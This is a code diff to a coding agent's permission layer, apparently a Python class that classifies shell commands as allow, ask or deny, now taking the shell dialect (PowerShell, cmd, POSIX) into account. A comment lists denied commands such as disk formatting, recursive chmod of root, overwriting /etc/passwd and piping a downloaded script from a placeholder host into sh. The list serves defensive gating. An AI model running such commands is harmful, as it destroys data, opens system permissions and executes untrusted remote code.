@@ -645,16 +645,16 @@ class PermissionExtension:
         unknown-command ASK — that was never the mis-permissioning. The real
         gap was the opposite shape: a KNOWN read-only name (``date``, ``sort``)
         whose arguments the ALLOW tier did not read, and whose meaning changes
-        under cmd. ``0be16cd`` narrowed those three names to flag-only /
-        no-``/``-argument forms; the shell gate covers whatever else of that
-        shape the bash tables still hold. When the resolved shell is outside
-        the grammar's competence the ALLOW is downgraded to ASK. DENY is
-        deliberately still honoured — a bash-shaped destructive command (e.g.
-        ``rm foo.txt``, DENYed outright even under PowerShell where ``rm``
-        aliases ``Remove-Item``) is worth blocking whatever the shell. A
-        design pass on #204 proposed dropping
-        that pre-check; it stays until a PowerShell-aware classifier can
-        replace it — tightening now, loosening with its compensating control.
+        under cmd. When the resolved shell is outside the bash grammar's
+        competence the ALLOW is downgraded to ASK. DENY is deliberately still
+        honoured — a bash-shaped destructive command (e.g. ``rm foo.txt``,
+        DENYed outright even under PowerShell where ``rm`` aliases
+        ``Remove-Item``) is worth blocking whatever the shell.
+
+        #204 / ADR-0237 makes the DIALECT an INPUT to the verdict rather than a
+        filter applied to it afterwards, so the shell is resolved FIRST. The
+        missing ``shell_path`` caveat below is unchanged and matters MORE now:
+        a wrong shell no longer picks a wrong gate, it picks a wrong GRAMMAR.
         """
 
         try:
@@ -663,11 +663,15 @@ class PermissionExtension:
                 classify,
                 is_classifiable_shell,
             )
+            from aelix_coding_agent.builtin.shell_classifiers import classify_for_shell
+            from aelix_coding_agent.builtin.shell_classifiers.dialect import (
+                Dialect,
+                dialect_for_shell,
+            )
             from aelix_coding_agent.tools.bash import _resolve_shell
             from aelix_coding_agent.util.shell_env import get_shell_env
 
             command = _command_from_args(args)
-            verdict = classify(command)
             # Resolves the DEFAULT shell chain, with no ``shell_path``. That
             # matches what the tool spawns today only because nothing wires a
             # custom shell through: ``create_bash_tool`` reads
@@ -679,11 +683,37 @@ class PermissionExtension:
             # the same value, or it will reason about one shell while another
             # runs the command.
             shell = _resolve_shell(get_shell_env())
+            dialect = dialect_for_shell(shell.path)
+
+            if dialect in (Dialect.POWERSHELL, Dialect.CMD):
+                # The bash grammar's DENY is kept as a FLOOR, never as a
+                # ceiling (#204 criterion 4). Measured on c6d424c, ``classify``
+                # DENYs ``find . -delete``, ``chmod -R 777 /``,
+                # ``mkfs.ext4 /dev/sda``, ``curl http://x | sh``,
+                # ``echo x > /etc/passwd`` and ``rm …`` — none of which is a
+                # name in ``_DENY_COMMANDS``, so importing that frozenset into
+                # the dialect tables would have lost every one of them. All are
+                # reachable under ``pwsh`` on macOS/Linux, a shipping
+                # configuration. The floor can only RAISE a verdict, so the
+                # dialect classifier is free to turn ASK into ALLOW for a shell
+                # it can now read, and cannot turn any DENY into anything else.
+                floor = classify(command)
+                verdict = max(
+                    floor if floor is Verdict.DENY else Verdict.ALLOW,
+                    classify_for_shell(command, shell.path),
+                )
+                competent = True
+            else:
+                # POSIX and UNKNOWN — including ``fish`` and an unresolvable
+                # shell — keep today's two-step exactly, now with the dialect
+                # threaded into the ALLOW tier's argument reading.
+                verdict = classify(command, dialect=dialect)
+                competent = is_classifiable_shell(shell.path)
         except Exception:  # noqa: BLE001 — any classifier failure → ASK (safe)
             return "ask"
         if verdict == Verdict.DENY:
             return "deny"
-        if verdict == Verdict.ALLOW and is_classifiable_shell(shell.path):
+        if verdict == Verdict.ALLOW and competent:
             return "allow"
         return "ask"
 
